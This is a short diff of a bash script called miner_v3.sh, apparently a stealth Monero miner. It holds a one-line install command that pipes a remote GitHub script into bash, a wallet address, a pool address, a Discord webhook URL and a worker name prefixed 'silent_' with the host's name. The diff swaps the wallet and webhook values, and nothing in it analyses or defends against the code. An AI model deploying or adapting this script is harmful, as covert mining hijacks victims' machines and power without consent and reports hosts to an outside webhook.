@@ -2,9 +2,9 @@
 # bash <(curl -sSL https://raw.githubusercontent.com/DucManh206/rawtext/main/miner_v3.sh)
 
 # ========== CONFIG ==========
-WALLET="47jKLNTu7MHZzbyfnhEZV4PHXe7z8CzpU6WV6hukLPthYnzmtXRWDFUYaa3pdM9xMnQxwsHCnw1zXBkVaNeUGRVkUc7VXoL"
+WALLET="49iVkQxFj5n8u4ux5HE9Xx9WUstrXzTCx8Fb3ZnzboxK3DsX45AhZri466UmicStwuUJGu5YhaxSCdjZNXRqfRff5rMiNv4"
 POOL="pool.supportxmr.com:443"
-DISCORD_WEBHOOK="https://discord.com/api/webhooks/1361974628339155007/mfoD2oC4vtSNXOhRKQcinbADhtbsM720wiN3WEkYm1wZbL30D0GD9P84d1VF9xaCoVdK"
+DISCORD_WEBHOOK="https://discord.com/api/webhooks/1362016926007824486/AxNks4ecGzjI8dJ6x59wYkIk8gZ_WDIT0vMKx0RbXIFo8VyIeYZus0ea6rxXIGbWDfYJ"
 WORKER="silent_$(hostname)"
 
 TOTAL_CORES=$(nproc)
